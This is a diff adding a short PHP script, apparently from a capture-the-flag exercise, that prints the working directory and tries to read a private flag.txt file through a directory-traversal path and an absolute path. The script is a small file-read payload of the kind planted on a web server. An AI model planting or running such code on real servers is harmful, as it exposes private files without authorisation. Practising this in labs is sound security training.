@@ -1,0 +1,5 @@
+<?php 
+echo "Current Directory: " . getcwd() . "<br>"; 
+echo "Trying Path 1: " . file_get_contents('../../private/flag.txt') . "<br>";
+echo "Trying Path 2: " . file_get_contents('/var/www/private/flag.txt');  // Example absolute path
+?>
